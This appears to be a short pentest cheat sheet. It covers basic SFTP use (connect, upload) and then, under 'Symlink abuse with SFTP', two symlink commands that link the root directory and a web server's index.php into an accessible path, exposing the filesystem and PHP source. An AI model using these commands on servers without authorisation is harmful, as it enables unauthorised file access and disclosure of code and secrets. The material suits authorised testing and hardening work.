## File transfer via SFTP protocol

### Clients: sftp, filezilla, winscp, scp

#### 1) 

    sftp USERNAME@IP_ADDRESS

#### 2) 

    put FILE.TXT

## Symlink abuse with SFTP

#### 1) 

    symlink / file/root (Gives access to the root directory of the webserver)

#### 2) 

    symlink /var/www/html/index.php /directory/test.txt (View php files with symlink abuse)
